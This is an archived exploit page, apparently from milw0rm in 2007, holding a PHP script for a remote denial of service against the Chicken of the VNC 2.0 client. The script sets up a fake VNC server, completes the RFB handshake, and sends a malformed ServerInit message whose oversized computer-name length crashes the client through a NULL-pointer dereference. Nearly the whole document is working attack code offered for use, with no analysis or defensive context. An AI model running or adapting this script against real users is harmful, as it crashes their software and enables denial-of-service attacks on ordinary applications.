<html><head><title>Chicken of the VNC 2.0 (NULL-pointer) Remote Denial of Service Exploit</title></head><pre>&lt;?
$port = &quot;5900&quot;;

$BadServerInit=
&quot;\x04\x00&quot;.                                     // fb-width
&quot;\x03\x00&quot;.                                     // fb-hight
&quot;\x20&quot;.                                         // bits per pixel
&quot;\x18&quot;.                                         // depth
&quot;\x00&quot;.                                         // big-endian flag
&quot;\x01&quot;.                                         // true-color flag
&quot;\x00\xff\x00\xff\x00\xff&quot;. 			// r-g-b max
&quot;\x10\x08\x00&quot;.                         	// r-g-b shift
&quot;\x00\x00\x00&quot;.                         	// padding
&quot;\xff\xff\xff\xff&quot;.                     	// computer-name size
&quot;DIE_PLZ&quot;;                                      // computer-name


$ser = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_set_option($ser,SOL_SOCKET,SO_REUSEADDR,1);
socket_bind($ser,&quot;0.0.0.0&quot;, $port);

socket_listen($ser, 5);

print &quot;this fake vnc server will crash cotv2.0 (http://sourceforge.net/projects/cotvnc/) due to a NULL-pointer dereference 02-02-2007   poplix [@] papuasia.org listening on $port ...\n&quot;;

$cotv = socket_accept($ser);
print &quot;client connected\n&quot;;

socket_write($cotv, &quot;RFB 00 3.008\n&quot;);
while($i=socket_read($cotv, 1024))
       if(substr($i,0,6) == &quot;RFB 00&quot;) break;


print &quot;protocol has been negotiated\n&quot;;

socket_write($cotv, &quot;\x00\x00\x00\x01&quot;);
while($i=socket_read($cotv, 1024))
       if(ord($i[0])==0 || ord($i[0])==1)break;

print &quot;sending expl...\n&quot;;

socket_write($cotv, $BadServerInit);


socket_close($cotv);

socket_close($ser);

print &quot;done\n&quot;;
?&gt;

# milw0rm.com [2007-02-02]</pre></html>